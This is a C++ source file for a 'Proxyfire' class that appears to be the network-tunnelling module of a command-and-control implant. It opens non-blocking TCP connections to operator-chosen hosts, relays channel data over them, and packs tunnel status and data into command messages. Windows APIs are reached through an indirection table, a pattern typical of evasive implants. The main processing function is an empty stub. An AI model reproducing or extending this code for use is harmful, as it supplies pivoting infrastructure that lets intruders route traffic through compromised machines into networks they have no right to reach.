#include "Proxyfire.h"

void PackProxyStatus(Packer* packer, ULONG channelId, BOOL result)
{
	packer->Pack32(channelId);
	packer->Pack32(COMMAND_TUNNEL_START);
	packer->Pack8(result);
}

void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
{
	packer->Pack32(channelId);
	packer->Pack32(COMMAND_TUNNEL_WRITE);
	packer->PackBytes(data, dataSize);
}

void Proxyfire::AddProxyData(ULONG channelId, SOCKET sock, ULONG waitTime, ULONG mode, ULONG state)
{
	TunnelData tunnelData = { 0 };
	tunnelData.channelID = channelId;
	tunnelData.sock      = sock;
	tunnelData.waitTime  = waitTime;
	tunnelData.mode      = mode;
	tunnelData.state     = state;
	tunnelData.startTick = ApiWin->GetTickCount();
	this->tunnels.push_back(tunnelData);
}

//////////

WORD _htons(WORD hostshort)
{
	return ((hostshort >> 8) & 0x00FF) | ((hostshort << 8) & 0xFF00);
}

void Proxyfire::ConnectMessageTCP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				sockaddr socketAddress;
				memcpy(&socketAddress.sa_data[2], *(const void**)host->h_addr_list, host->h_length); 				//memmove
				socketAddress.sa_family = 2;
				*(WORD*)socketAddress.sa_data = _htons(port);
				u_long mode = 1;
				if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
					if (!(ApiWin->connect(sock, &socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_TCP, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, FALSE);
	}
}

void Proxyfire::ConnectWrite(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;

			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					if (ApiWin->send(tunnelData->sock, data, dataSize, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
						return;
					ApiWin->Sleep(1000);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectClose(ULONG channelId)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state != TUNNEL_STATE_CLOSE && tunnelData->mode != TUNNEL_MODE_RECV_TCP) {
			tunnelData->state = TUNNEL_STATE_CLOSE;
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ProcessTunnels(Packer* packer)
{

}